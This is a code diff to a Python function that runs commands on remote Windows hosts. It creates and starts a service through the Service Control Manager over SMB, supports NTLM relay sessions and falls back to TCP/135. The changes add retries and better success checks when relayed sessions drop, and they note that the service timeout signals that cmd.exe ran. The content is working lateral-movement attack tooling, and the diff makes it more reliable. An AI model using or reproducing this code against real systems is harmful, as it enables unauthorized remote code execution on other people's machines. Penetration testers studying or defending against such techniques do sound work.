@@ -168,27 +168,40 @@ def _scm_exec(host, auth, command, cwd, timeout=120, verbose=False):
     # can refresh.  In non-relay mode, fall back to TCP/135 once all retries
     # fail (some targets return ERROR_INVALID_PARAMETER for CreateService over
     # named pipe).
+    def _create_ok(out, rc):
+        # Titanis exits 0 even when it throws an unhandled exception; the only
+        # reliable success signal is non-empty stdout (the service name / status
+        # line Scm prints on success).  Any rc != 0 is also a clear failure.
+        return rc == 0 and bool(out.strip())
+
     rc = 1
+    out_c = ''
     for attempt in range(3):
-        _, rc = run(SCM, 'create', auth, [smb_host, svc_name, bin_path, '-PreferSmb'],
-                    verbose=verbose, timeout=30)
-        if rc == 0:
+        out_c, rc = run(SCM, 'create', auth, [smb_host, svc_name, bin_path, '-PreferSmb'],
+                        verbose=verbose, timeout=30)
+        if _create_ok(out_c, rc):
             break
         if attempt < 2:
-            print(f'  [scm] create failed (rc={rc}) — waiting for relay session...',
+            print(f'  [scm] create failed — waiting for relay session...',
                   file=sys.stderr)
             time.sleep(4)
-    if rc != 0 and not relay_mode:
-        _, rc = run(SCM, 'create', auth, [smb_host, svc_name, bin_path],
-                    verbose=verbose, timeout=30)
-    if rc != 0:
-        return f'[!] Scm create failed (rc={rc})\n', rc
+    if not _create_ok(out_c, rc) and not relay_mode:
+        out_c, rc = run(SCM, 'create', auth, [smb_host, svc_name, bin_path],
+                        verbose=verbose, timeout=30)
+    if not _create_ok(out_c, rc):
+        return f'[!] Scm create failed\n', 1
 
     # Start via named pipe (port 445).  cmd.exe exits without calling
-    # SetServiceStatus, so SCM raises ERROR_SERVICE_REQUEST_TIMEOUT — that is
-    # the expected "success" signal meaning the command ran.
-    _, _ = run(SCM, 'start', auth, [smb_host, svc_name, '-PreferSmb'],
-               verbose=verbose, timeout=max(timeout, 40))
+    # SetServiceStatus, so SCM raises ERROR_SERVICE_REQUEST_TIMEOUT (rc != 0)
+    # even on success — that timeout IS the success signal meaning cmd ran.
+    # Just fire and ignore the return code; the output file is the truth.
+    # If the relay session dropped between create and start, retry once.
+    out_s, rc_s = run(SCM, 'start', auth, [smb_host, svc_name, '-PreferSmb'],
+                      verbose=verbose, timeout=max(timeout, 40))
+    if rc_s != 0 and not out_s.strip():
+        time.sleep(2)
+        run(SCM, 'start', auth, [smb_host, svc_name, '-PreferSmb'],
+            verbose=verbose, timeout=max(timeout, 40))
 
     # Brief sleep so cmd.exe flushes the output file before we read it.
     time.sleep(3)
